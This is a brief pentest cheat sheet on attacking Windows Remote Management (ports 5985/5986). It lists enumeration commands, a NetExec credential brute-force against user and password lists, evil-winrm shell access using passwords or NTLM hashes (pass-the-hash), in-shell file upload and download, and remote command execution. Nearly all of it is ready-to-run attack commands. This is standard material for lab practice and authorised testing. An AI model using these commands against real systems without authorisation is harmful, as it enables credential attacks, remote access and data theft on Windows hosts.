# WinRM (5985, 5986)

!!! tip "Start here"
    WinRM is normally useful after obtaining valid credentials. Validate the account with NetExec, then use Evil-WinRM when an interactive PowerShell session is needed. Port 5985 is HTTP and 5986 is HTTPS.

---

## Enumeration

```bash
nmap -p 5985,5986 $IP
curl -sk http://$IP:5985/wsman
curl -sk https://$IP:5986/wsman
```

---

## Brute Force

```bash
nxc winrm $IP -u users.txt -p passwords.txt
```

---

## Shell via evil-winrm

```bash
evil-winrm -i $IP -u "$USERNAME" -p "$PASSWORD"
evil-winrm -i $IP -u "$USERNAME" -H "$NTLM_HASH"
evil-winrm -i $IP -P 5986 -S -u "$USERNAME" -p "$PASSWORD"
```

Upload/download files from within the shell:

```
*Evil-WinRM* PS> upload /path/to/local/file C:\destination
*Evil-WinRM* PS> download C:\path\to\remote\file /local/destination
```

---

## Remote Command Execution

```bash
nxc winrm $IP -u "$USERNAME" -p "$PASSWORD" -x "whoami"
nxc winrm $IP -u "$USERNAME" -H "$NTLM_HASH" -x "ipconfig"
```
